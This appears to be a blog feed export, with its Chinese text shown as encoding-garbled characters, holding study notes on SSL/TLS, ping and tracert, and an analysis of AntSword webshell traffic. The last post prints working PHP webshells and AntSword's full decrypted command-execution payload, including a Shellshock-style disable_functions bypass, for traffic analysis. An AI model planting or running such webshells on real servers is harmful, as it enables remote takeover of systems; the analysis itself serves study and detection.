title="CSRFé˜²æŠ¤"></a>CSRFé˜²æŠ¤</h3><p>å°±flaskçš„csrfé˜²æŠ¤æ–¹æ³•è€Œè¨€ï¼Œä¸»è¦æ˜¯é˜²æ­¢hackeræ‹¿åˆ°tokenï¼Œä¸»è¦éœ€è¦é˜²èŒƒxssï¼Œæ¯”å¦‚ä¸Šè¿°æåˆ°çš„sstiä¼šå¯¼è‡´xssã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSL&amp;TLS</title>
      <link href="2020/05/01/SSL-TLS/"/>
      <url>2020/05/01/SSL-TLS/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¤ä¹ è®¡ç®—æœºç½‘ç»œçœ‹åˆ°äº†è®¡ç®—æœºç½‘ç»œå®‰å…¨é‚£ä¸€ç« ï¼Œå¯¹SSL TLS è¯ä¹¦ç­‰å†…å®¹æœ‰äº†åˆæ­¥ç†è§£ï¼Œè¿™é‡Œåšä¸€ä¸ªè®°å½•ã€‚<br>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html</a><br><a href="https://segmentfault.com/a/1190000002554673">https://segmentfault.com/a/1190000002554673</a><br><a href="https://kb.cnblogs.com/page/197396/">https://kb.cnblogs.com/page/197396/</a><br><a href="https://www.cnblogs.com/handsomeBoys/p/6556336.html">https://www.cnblogs.com/handsomeBoys/p/6556336.html</a></p><h2 id="è¯ä¹¦"><a href="#è¯ä¹¦" class="headerlink" title="è¯ä¹¦"></a>è¯ä¹¦</h2><p>CAæ˜¯è¯ä¹¦æˆæƒä¸­å¿ƒï¼Œç®€å•è¯´å°±æ˜¯ç­¾å‘è¯ä¹¦çš„æœºæ„ã€‚<br>è¯ä¹¦ç­¾å‘æµç¨‹ï¼šæœåŠ¡ç«¯å‘CAæäº¤å…¬é’¥ï¼Œç»„ç»‡ä¿¡æ¯ï¼ŒåŸŸåç­‰å†…å®¹<br>CAå®¡æ ¸é€šè¿‡åç­¾å‘è¯ä¹¦ï¼Œè¯ä¹¦åŒ…æ‹¬äº†ï¼šç”³è¯·è€…å…¬é’¥ï¼Œç”³è¯·è€…ä¿¡æ¯ã€åŸŸåã€æœ‰æ•ˆæ—¶é—´ã€åºåˆ—å·ç­‰å†…å®¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ•°å­—ç­¾åï¼šCAç”¨CAè‡ªå·±çš„ç§é’¥å¯¹ç”³è¯·è€…æ‰€æœ‰ä¿¡æ¯ç”Ÿæˆçš„æ‘˜è¦è¿›è¡ŒåŠ å¯†ã€‚<br>ç®€å•æ¥è¯´ï¼Œè¯ä¹¦=ç”³è¯·è€…å…¬é’¥+CAç­¾å+ç”³è¯·è€…ä¿¡æ¯</p><h2 id="httpsè¯·æ±‚è¿‡ç¨‹"><a href="#httpsè¯·æ±‚è¿‡ç¨‹" class="headerlink" title="httpsè¯·æ±‚è¿‡ç¨‹"></a>httpsè¯·æ±‚è¿‡ç¨‹</h2><p>1.å®¢æˆ·ç«¯å‘æœåŠ¡å™¨443ç«¯å£å‘é€è¯·æ±‚<br>2.æœåŠ¡å™¨è¿”å›è¯ä¹¦<br>3.å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§ï¼Œå¹¶ä¸”äº§ç”Ÿä¸€éšæœºå€¼ï¼Œé€šè¿‡æœåŠ¡å™¨å…¬é’¥åŠ å¯†ã€‚<br>4.æœåŠ¡å™¨æ”¶åˆ°åŠ å¯†åçš„éšæœºå€¼åï¼Œç”¨ç§é’¥è§£å¯†ï¼Œæ¥ä¸‹æ¥åŒæ–¹ä¼ è¾“çš„å†…å®¹éƒ½ç”¨è¯¥éšæœºå€¼åŠ å¯†ã€‚</p><h2 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h2><p>é€šä¿¡è¿‡ç¨‹ï¼š<br>1.å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå£°æ˜è‡ªå·±çš„åŠ å¯†æ–¹å¼ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªéšæœºæ•°<br>2.æœåŠ¡å™¨è¿”å›è¯ä¹¦ï¼Œç¡®å®šä½¿ç”¨çš„åŠ å¯†æ–¹å¼ï¼Œå‘é€ä¸€ä¸ªéšæœºæ•°<br>3.å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§ï¼ŒéªŒè¯é€šè¿‡åï¼Œäº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼Œé€šè¿‡æœåŠ¡å™¨å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œä½œä¸ºpremaster keyå‘é€ç»™æœåŠ¡å™¨ã€‚<br>4.æœåŠ¡å™¨æ¥å—åˆ°åŠ å¯†åçš„éšæœºæ•°åè§£å¯†<br>5.å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ ¹æ®ç›¸åŒçš„ç®—æ³•ï¼Œé€šè¿‡ä¸¤ä¸ªæœªåŠ å¯†çš„éšæœºæ•°ä¸ç¬¬ä¸‰ä¸ªéšæœºæ•°äº§ç”Ÿsession key<br>6.æœåŠ¡å™¨ä½¿ç”¨session keyå‘é€ä¸€ä¸ªæ•°æ®ï¼ŒéªŒè¯è¿æ¥æ˜¯å¦æˆåŠŸå»ºç«‹ã€‚<br>7.ä»¥åå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„é€šè®¯ä½¿ç”¨session keyåŠ å¯†ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ping&amp;tracert</title>
      <link href="2020/05/01/ICMP-tracert/"/>
      <url>2020/05/01/ICMP-tracert/</url>
      
        <content type="html"><![CDATA[<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>pingå‘½ä»¤ç”¨çš„æ˜¯ICMPå›é€è¯·æ±‚ä¸å›ç­”ï¼Œå¦‚æœpingä¸€ä¸ªå­˜åœ¨çš„ä¸»æœºçš„è¯ï¼Œåœ¨ä¸ç¦æ­¢pingçš„å‰æä¸‹ä¼šå‘ä¸€ä¸ªICMPå›é€å›ç­”ï¼Œä¸»æœºè®¡ç®—RTTï¼Œå¹³å‡RTTä¸TTLã€‚</p><h1 id="tracert-traceroute"><a href="#tracert-traceroute" class="headerlink" title="tracert/traceroute"></a>tracert/traceroute</h1><p>åˆ©ç”¨çš„æ˜¯pingå‘½ä»¤ï¼ŒæŠŠttlä»1å¾€ä¸ŠåŠ ï¼Œå½“è·¯ç”±å™¨æ”¶åˆ°ttlä¸º1çš„æ•°æ®åŒ…å-1å˜æˆ0ï¼Œä¼šç»™æºç«™å‘ä¸€ä¸ªè¶…æ—¶ï¼Œä½†æ˜¯å­˜åœ¨çš„é—®é¢˜æ˜¯å¦‚æœè¯¥è·¯ç”±å™¨å¯¹è¶…æ—¶ä¸å¤„ç†çš„è¯ï¼Œåœ¨æºç«™çœ‹åˆ°çš„èŠ‚ç‚¹å°±å˜æˆäº†*ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŸäº›è·¯ç”±å™¨å¯¹tracertå‘½ä»¤ä¸å¯è§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èšå‰‘æµé‡åˆ†æ&amp;webshell</title>
      <link href="2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"/>
      <url>2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="webshellç†è§£"><a href="#webshellç†è§£" class="headerlink" title="webshellç†è§£"></a>webshellç†è§£</h1><p>webshellçš„æœ¬è´¨æ˜¯ä¼ å…¥å‘½ä»¤å¹¶ä¸”æ‰§è¡Œã€‚<br>å¸¸è§çš„php webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="meta">?&gt;</span>) </span><br></pre></td></tr></table></figure><blockquote><p>shell.php<br>è®¿é—®shell.phpçš„æ—¶å€™postä¸€ä¸ªå‚æ•°cmd,<br>å¦‚æœä¼ å…¥çš„æ˜¯cmd=system(â€œwhoamiâ€)çš„è¯å°±ä¼šæ‰§è¡Œwhoamiã€‚<br>webshellç›¸å½“äºç½‘ç«™ç®¡ç†åŠŸèƒ½ï¼Œæä¾›åˆ—ç›®å½•ï¼Œä¿®æ”¹æ–‡ä»¶ï¼Œè™šæ‹Ÿç»ˆç«¯ç­‰æ“ä½œï¼Œè¿™äº›å¯è§†åŒ–æ“ä½œçš„èƒŒåå…¶å®æ˜¯ä¸€æ¡æ¡PHPè¯­å¥å†™çš„ï¼Œç„¶åé€åˆ°æœåŠ¡å™¨æ‰§è¡Œï¼Œç„¶åæ ¹æ®è¿”å›ç»“æœå¯è§†åŒ–åˆ°ç®¡ç†ç»ˆç«¯ã€‚<br>shellä¸wafä¸€ç›´åœ¨å‡çº§ï¼Œè¡ç”Ÿå‡ºäº†å„ç§æ··æ·†æ–¹æ³•ã€‚å½“ç„¶ï¼Œwafä¹Ÿåœ¨æŠ“ç‰¹å¾æµé‡è¿›è¡Œæ‹¦æˆªã€‚</p></blockquote><h1 id="èšå‰‘æµé‡åˆ†æ"><a href="#èšå‰‘æµé‡åˆ†æ" class="headerlink" title="èšå‰‘æµé‡åˆ†æ"></a>èšå‰‘æµé‡åˆ†æ</h1><p>ä»Šå¤©åˆ†æçš„æ˜¯æ˜¨å¤©æ²¡çœ‹å®Œçš„èšå‰‘æµé‡ã€‚å‘é€æ•°æ®é‡‡ç”¨RSAåŠ å¯†ï¼ŒæœåŠ¡å™¨è¿”å›æ•°æ®é‡‡ç”¨AESåŠ å¯†ã€‚<br>shellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/E</span><br><span class="line">rkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt</span><br><span class="line">/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2</span><br><span class="line">wQUED9OTJg9AuXIG4QIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¨¡æ‹Ÿä¸€æ¬¡è¿‡ç¨‹ï¼šå¯åŠ¨è™šæ‹Ÿç»ˆç«¯å¹¶è¾“å…¥whoamiæŸ¥è¯¢ã€‚</p><h2 id="åœ¨wiresharkæŠ“åˆ°æ•°æ®åŒ…ï¼š"><a href="#åœ¨wiresharkæŠ“åˆ°æ•°æ®åŒ…ï¼š" class="headerlink" title="åœ¨wiresharkæŠ“åˆ°æ•°æ®åŒ…ï¼š"></a>åœ¨wiresharkæŠ“åˆ°æ•°æ®åŒ…ï¼š</h2><img src="http://cdn.polowong.top/static/images/as1.jpg"><h2 id="è¿½è¸ªHTTPæµé‡ï¼š"><a href="#è¿½è¸ªHTTPæµé‡ï¼š" class="headerlink" title="è¿½è¸ªHTTPæµé‡ï¼š"></a>è¿½è¸ªHTTPæµé‡ï¼š</h2><img src="http://cdn.polowong.top/static/images/as2.jpg"><h2 id="å¯¹å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸ"><a href="#å¯¹å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸ" class="headerlink" title="å¯¹å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸ"></a>å¯¹å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸ</h2><p>ä½¿ç”¨ç§é’¥åŠ å¯†çš„æ•°æ®ç”¨å…¬é’¥è§£å¯†ã€‚<br>è§£å¯†åæ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ant=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;</span><br><span class="line"><span class="comment">//é‡‡ç”¨AESåŠ å¯†è¾“å‡ºï¼Œkeyä¸ºsessionå‰16ä½ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;3c5e3e9640&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;cda10a9ad&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//è¾“å‡ºå†…å®¹</span></span><br><span class="line">ob_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;kba6818a1ddd35&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;med28329bbe5b9&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;v610da0caba97e&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="comment">//è·å–ä¸‹é¢postçš„å‚æ•°ï¼Œåˆ†åˆ«æ˜¯cmdå’Œwhoamiã€‚</span></span><br><span class="line"><span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;</span><br><span class="line"><span class="comment">//åˆ¤æ–­æ˜¯Linuxè¿˜æ˜¯Windows</span></span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//æ‹¼æ¥å‘½ä»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;</span><br><span class="line"><span class="comment">//å‘½ä»¤æ‰§è¡Œå‡½æ•°</span></span><br><span class="line"><span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//å‘½ä»¤æ‰§è¡Œå¹¶ä¸”stderré‡å®šå‘åˆ°stdout</span></span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="comment">//æ‰§è¡Œå…¥å£</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæ˜¯postçš„æ•°æ®ï¼Œå¯¹åº”ä¸Šé¢çš„med28329bbe5b9å’Œkba6818a1ddd35ã€‚ã€‚ã€‚&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…·ä½“çš„æ“ä½œå†™åœ¨ä¸Šæ–¹æ³¨é‡Šé‡Œäº†ï¼Œæ¯”è¾ƒæ¸…æ¥šã€‚</p><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p>æ¥ä¸‹æ¥å¯åŠ¨è™šæ‹Ÿç»ˆç«¯ï¼Œä¼ å…¥whoami ï¼Œå¹¶ä¸”æ‰§è¡Œï¼ŒæŸ¥çœ‹æ•°æ®åŒ…ã€‚</p><img src="http://cdn.polowong.top/static/images/as4.jpg"><h2 id="è¿”å›æ•°æ®è§£å¯†"><a href="#è¿”å›æ•°æ®è§£å¯†" class="headerlink" title="è¿”å›æ•°æ®è§£å¯†"></a>è¿”å›æ•°æ®è§£å¯†</h2><p>å®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®åä¼šç”¨çº¦å®šçš„keyè¿›è¡Œè§£å¯†ã€‚<br>è¿”å›æ•°æ®ï¼š<img src="http://cdn.polowong.top/static/images/as3.jpg"><br>æ³¨æ„ï¼šè¿”å›çš„æ•°æ®é‡Œé¢å¹¶ä¸å…¨æ˜¯æœ‰æ•ˆåŠ å¯†å†…å®¹ï¼Œå‰åå­˜åœ¨ä¸¤ç«¯å¹²æ‰°æ•°æ®ï¼Œå¯ä»¥åœ¨ ä»£ç ä¸­çœ‹åˆ°åˆ†åˆ«æ˜¯3c5e3e9640å’Œcda10a9adã€‚ä¸­é—´çš„æ•°æ®æ‰æ˜¯çœŸæ­£æœ‰ç”¨çš„æ•°æ®ã€‚<br>é¦–å…ˆå¯¹ä¸­é—´çš„æ•°æ®base64è§£å¯†ä¸€æ¬¡ï¼Œç„¶åä½¿ç”¨AES-128-ECBè§£å¯†ã€‚keyä¸ºsessionå‰16ä½ï¼šsubstr(sessionid,0,16);ã€‚è§£å¯†æ–¹æ³•ï¼šopenssl_decrypt($payload, â€˜AES-128-ECBâ€™, $key,OPENSSL_RAW_DATA)è§£å¯†åæ•°æ®ï¼šZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0K<br>ç„¶åè¿›è¡Œbase64è§£å¯†ã€‚è§£å¯†åçš„æ•°æ®ï¼šdesktop-4u81b85\69027<br>[S]<br>E:\phpstudy_pro\WWW\test.io<br>[E]<br>å°±æ˜¯æ‰§è¡Œwhoamiçš„ç»“æœã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 